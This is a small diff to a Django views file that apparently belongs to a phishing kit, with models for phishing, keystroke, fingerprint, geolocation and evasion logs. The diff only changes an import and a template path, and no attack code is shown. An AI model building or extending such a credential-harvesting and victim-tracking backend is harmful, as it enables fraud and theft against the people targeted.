@@ -6,7 +6,9 @@ from django.shortcuts import render
 from django.conf import settings
 from django.template import loader
 from .models import PhishingLog, KeystrokeLog, FingerprintLog, GeoLog, EvasionLog
-from django.views.generic import TemplateView
+from django.views.generic import TemplateView, View
+
+
 
 @csrf_exempt
 def handle_submission(request):
@@ -64,7 +66,7 @@ def view_logs(request):
         'geos': GeoLog.objects.all(),
         'evasions': EvasionLog.objects.all()
     }
-    return render(request, 'dashboard.html', logs)
+    return render(request, 'base/dashboard.html', logs)
 
 def export_project(request):
     export_path = os.path.join(settings.BASE_DIR, 'phishing_export.zip')
